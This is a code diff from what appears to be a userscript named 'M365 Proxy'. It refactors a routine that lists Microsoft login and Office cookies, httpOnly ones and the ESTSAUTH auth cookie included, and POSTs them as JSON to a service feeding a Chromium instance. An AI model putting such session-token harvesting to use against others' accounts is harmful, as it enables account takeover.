@@ -84,103 +84,59 @@
         const allCookies = [];
         const seen = new Set();
 
-        // First: query cookies for the current page URL (always has permission)
-        const currentUrl = location.href;
+        function addCookie(c) {
+            const key = c.name + '@' + c.domain;
+            if (seen.has(key)) return;
+            seen.add(key);
+            allCookies.push({
+                name: c.name || '',
+                value: c.value || '',
+                domain: c.domain || '',
+                path: c.path || '/',
+                secure: c.secure !== false,
+                httpOnly: !!c.httpOnly,
+                sameSite: (c.sameSite || '').charAt(0).toUpperCase() + (c.sameSite || '').slice(1).toLowerCase() || 'None',
+                expires: c.expirationDate || c.expires || undefined,
+            });
+        }
 
-        // Query by domain — URLs must match @include/@match patterns
-        const domains = [
-            {},  // no url = current document URL (always works)
+        function gmCookieList(details) {
+            return new Promise((resolve) => {
+                const timer = setTimeout(() => resolve([]), 1500);
+                try {
+                    GM_cookie.list(details, (c, err) => {
+                        clearTimeout(timer);
+                        if (err) { resolve([]); }
+                        else { resolve(c || []); }
+                    });
+                } catch(e) { clearTimeout(timer); resolve([]); }
+            });
+        }
+
+        // All queries to run in parallel
+        const queries = [
+            {},  // current document URL
             { url: 'https://m365.cloud.microsoft/' },
             { url: 'https://login.microsoftonline.com/' },
             { url: 'https://microsoftonline.com/' },
             { url: 'https://microsoft.com/' },
             { url: 'https://office.com/' },
             { url: 'https://www.office.com/' },
+            { domain: '.login.microsoftonline.com' },
+            { domain: '.microsoft.com' },
+            { domain: '.microsoftonline.com' },
         ];
 
-        for (const details of domains) {
-            try {
-                let cookies = null;
-                // Try callback-based GM_cookie.list first
-                if (typeof GM_cookie !== 'undefined' && typeof GM_cookie.list === 'function') {
-                    cookies = await new Promise((resolve) => {
-                        const timer = setTimeout(() => resolve([]), 3000);
-                        try {
-                            GM_cookie.list(details, (c, err) => {
-                                clearTimeout(timer);
-                                if (err) { console.warn(`GM_cookie.list error for`, details, err); resolve([]); }
-                                else { console.log(`[M365 Proxy] GM_cookie.list for`, details.url, `→`, (c||[]).length, 'cookies'); resolve(c || []); }
-                            });
-                        } catch(e) { clearTimeout(timer); console.warn(`GM_cookie.list exception:`, e); resolve([]); }
-                    });
-                }
-                // Try promise-based GM.cookie.list() as fallback
-                else if (typeof GM !== 'undefined' && GM.cookie && typeof GM.cookie.list === 'function') {
-                    try {
-                        cookies = await GM.cookie.list(details);
-                        console.log(`[M365 Proxy] GM.cookie.list for`, details.url, `→`, (cookies||[]).length, 'cookies');
-                    } catch (e) {
-                        console.warn(`GM.cookie.list error:`, e);
-                        cookies = [];
-                    }
-                } else {
-                    continue;
-                }
+        // Run all queries in parallel
+        const results = await Promise.all(queries.map(q => gmCookieList(q)));
 
-                for (const c of (cookies || [])) {
-                    const key = c.name + '@' + c.domain;
-                    if (!seen.has(key)) {
-                        seen.add(key);
-                        allCookies.push({
-                            name: c.name || '',
-                            value: c.value || '',
-                            domain: c.domain || '',
-                            path: c.path || '/',
-                            secure: c.secure !== false,
-                            httpOnly: !!c.httpOnly,
-                            sameSite: (c.sameSite || '').charAt(0).toUpperCase() + (c.sameSite || '').slice(1).toLowerCase() || 'None',
-                            expires: c.expirationDate || c.expires || undefined,
-                        });
-                    }
-                }
-            } catch (e) {
-                console.warn(`Cookie listing failed for`, details, e);
+        for (const cookies of results) {
+            for (const c of (cookies || [])) {
+                addCookie(c);
             }
         }
 
-        // Also try domain-based query for ESTSAUTH specifically
-        if (typeof GM_cookie !== 'undefined' && typeof GM_cookie.list === 'function') {
-            for (const domain of ['.login.microsoftonline.com', '.microsoft.com', '.microsoftonline.com']) {
-                try {
-                    const extra = await new Promise((resolve) => {
-                        const timer = setTimeout(() => resolve([]), 2000);
-                        GM_cookie.list({ domain: domain }, (c, err) => {
-                            clearTimeout(timer);
-                            resolve(err ? [] : (c || []));
-                        });
-                    });
-                    for (const c of extra) {
-                        const key = c.name + '@' + c.domain;
-                        if (!seen.has(key)) {
-                            seen.add(key);
-                            allCookies.push({
-                                name: c.name || '',
-                                value: c.value || '',
-                                domain: c.domain || '',
-                                path: c.path || '/',
-                                secure: c.secure !== false,
-                                httpOnly: !!c.httpOnly,
-                                sameSite: (c.sameSite || '').charAt(0).toUpperCase() + (c.sameSite || '').slice(1).toLowerCase() || 'None',
-                                expires: c.expirationDate || c.expires || undefined,
-                            });
-                        }
-                    }
-                } catch(e) {}
-            }
-        }
-
-        console.log(`[M365 Proxy] Total cookies collected:`, allCookies.length, '(httpOnly:', allCookies.filter(c=>c.httpOnly).length, ')');
-        console.log('[M365 Proxy] Cookie names:', allCookies.map(c => c.name + (c.httpOnce ? '*' : '') + '@' + c.domain).join(', '));
+        console.log(`[M365 Proxy] Total cookies:`, allCookies.length, '(httpOnly:', allCookies.filter(c=>c.httpOnly).length, ')');
         return allCookies;
     }
 
@@ -266,7 +222,7 @@
                         body: JSON.stringify({ cookies })
                     });
                     // Wait for Chromium to process cookies and reload
-                    await new Promise(r => setTimeout(r, 5000));
+                    await new Promise(r => setTimeout(r, 3000));
                 }
             }
 
